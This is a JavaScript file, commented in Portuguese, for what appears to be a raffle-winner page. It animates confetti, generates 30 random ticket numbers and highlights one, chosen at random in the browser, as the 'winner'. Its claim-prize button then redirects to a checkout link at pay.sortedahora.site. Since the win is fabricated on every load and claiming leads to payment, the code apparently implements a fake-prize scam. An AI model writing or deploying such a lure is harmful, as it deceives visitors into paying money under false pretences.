document.addEventListener('DOMContentLoaded', () => {
    // Configuração do confetti
    const confetti = document.querySelector('.confetti');
    const colors = ['#ffd700', '#ff0000', '#00ff00', '#0000ff', '#ff00ff', '#00ffff'];
    const shapes = ['square', 'rectangle', 'hexagram', 'pentagram'];

    // Criar confetti
    for (let i = 0; i < 50; i++) {
        const confettiElement = document.createElement('div');
        const shape = shapes[Math.floor(Math.random() * shapes.length)];
        confettiElement.className = shape;
        confettiElement.style.setProperty('--bg', colors[Math.floor(Math.random() * colors.length)]);
        confettiElement.style.setProperty('--opacity', Math.random() + 0.2);
        confettiElement.style.left = Math.random() * 100 + 'vw';
        confettiElement.style.animationDelay = Math.random() * 3 + 's';
        confettiElement.style.animationDuration = Math.random() * 2 + 3 + 's';
        confettiElement.style.animationName = `confetti-${['slow', 'medium', 'fast'][Math.floor(Math.random() * 3)]}`;
        confetti.appendChild(confettiElement);
    }

    const numbersContainer = document.querySelector('.numbers-container');
    const totalTickets = 30;
    const usedNumbers = new Set();
    const winningIndex = Math.floor(Math.random() * totalTickets); // Número vencedor aleatório

    // Função para gerar número aleatório único
    function generateUniqueNumber() {
        let number;
        do {
            number = Math.floor(Math.random() * 1000) + 1;
        } while (usedNumbers.has(number));
        usedNumbers.add(number);
        return number.toString().padStart(4, '0');
    }

    // Gera 30 números únicos
    const purchasedNumbers = Array.from({ length: totalTickets }, () => generateUniqueNumber());

    // Adiciona os números à página
    purchasedNumbers.forEach((number, index) => {
        const numberElement = document.createElement('div');
        numberElement.className = 'number';
        if (index === winningIndex) {
            numberElement.classList.add('winner');
            // Scroll suave até o número vencedor após um pequeno delay
            setTimeout(() => {
                numberElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 1000);
        }
        numberElement.textContent = number;
        numbersContainer.appendChild(numberElement);
    });

    // Adiciona efeito de piscar para o número vencedor
    const winnerNumber = document.querySelector('.number.winner');
    if (winnerNumber) {
        setInterval(() => {
            winnerNumber.style.transform = 'scale(1.15)';
            setTimeout(() => {
                winnerNumber.style.transform = 'scale(1.1)';
            }, 200);
        }, 2000);
    }
});

// Função para reivindicar o prêmio
function reivindicarPremio() {
    const button = document.querySelector('.claim-button');
    
    // Desabilita o botão e mostra loading
    button.disabled = true;
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    
    // Redireciona para o link do Viva Checkout após um pequeno delay
    setTimeout(() => {
        window.location.href = 'https://pay.sortedahora.site/ODAK3LoXOjDgE6V';
    }, 1500);
} 